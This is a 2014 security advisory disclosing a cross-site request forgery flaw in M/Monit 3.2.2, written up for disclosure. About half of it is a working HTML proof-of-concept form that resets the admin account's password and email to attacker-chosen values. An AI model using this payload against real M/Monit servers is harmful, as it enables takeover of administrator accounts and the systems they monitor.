@@ -1,0 +1,24 @@
+Vulnerability title: M/Monit CSRF Author: Dolev Farhi Contact: dolevf at 
+openflare dot com @dolevff Application: M/Monit 3.2.2 Date: 13.9.2014 
+Relevant CVEs: N/A Vulnerable version: <= 3.2.2 Fixed version: N/A 1. 
+About the application ------------------------ Easy, proactive 
+monitoring of Unix systems, network and cloud services. Conduct 
+automatic maintenance and recovery and execute meaningful causal actions 
+in error situations M/Monit expand on Monit's capabilities and provides 
+monitoring and management of all your Monit enabled hosts via a modern, 
+clean and well designed user interface which also works on mobile 
+devices. 2. Vulnerabilities Descriptions: ----------------------------- 
+It was found that M/Monit latest version is vulnerable to CSRF attacks. 
+it is possible to reset the password of any user account (admin/regular) 
+on the system without needing to know the current set password for the 
+attacked account. 3. Proof of concept exploit 
+---------------------------- <html> <! -- CSRF PoC for M/Monit --> <div 
+align="center"> <pre> <h2><b> 		 CSRF PoC for M/monit 			<b></h2> <body> 
+<form action="http://mmonit_server:8080/admin/users/update" 
+method="POST"> <input type="hidden" name="fullname" 
+value="Administrator" /> <input type="hidden" name="password" 
+value="Attacker_Passw0rd" /> <input type="hidden" name="email" 
+value="attacker@email.com" /> <input type="hidden" name="admin" 
+value="on" /> <input type="hidden" name="uname" value="admin" /> <input 
+type="submit" name="submit" value="Attack" /> 	</form> 	</body> </div> 
+</html>
